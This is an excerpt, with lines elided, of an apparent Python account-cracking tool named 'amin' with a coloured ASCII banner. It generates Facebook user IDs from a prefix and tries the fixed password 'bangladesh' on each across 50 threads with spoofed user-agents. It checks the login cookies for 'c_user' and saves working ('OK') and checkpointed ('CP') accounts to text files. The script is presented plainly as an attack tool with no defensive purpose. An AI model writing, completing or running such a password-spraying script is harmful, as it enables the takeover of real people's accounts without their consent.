...
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝    \033[1;92m 
 ...
 def amin_menu(): 
     ...
     linex() 
     amin=input(' \033[1;32m[?] SELECT MENU: ') 
     if amin in['1','01']:amin() 
     elif amin in['0','00']:exit() 
     else:exit() 
 ...
 def amin(): 
     ...
     with ThreadPool(max_workers=50) as ahare: 
         ...
         for fuck in user: 
             pwx = [fuck,'bangladesh'] 
             uid = code+fuck 
             ahare.submit(aminx,uid,pwx,tl) 
     print('CRACK PROCESS HAS BEEN COMPLETED ') 
     print('Ok Ids Saved in /amin-OK.txt') 
     print('Cp Ids Saved in /amin-CP.txt') 
     linex() 
      
 def aminx(uid,pwx,tl): 
     global loop 
     global cps 
     global oks 
     global proxy 
     ...
     'user-agent': pro} 
             ...
             if 'c_user' in log_cookies: 
                 ...
                 cid = coki[7:22] 
                 print('\r\r\033[1;32m[amin-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m') 
                 ...
                 cid = coki[24:39] 
                 if 'y' in cp_cpx:  
                  print('\r\r\033[1;30m[amin-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m') 
                 ...
                 continue 
         loop+=1 
         sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mamin\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))), 
         sys.stdout.flush() 
     except: 
         pass 
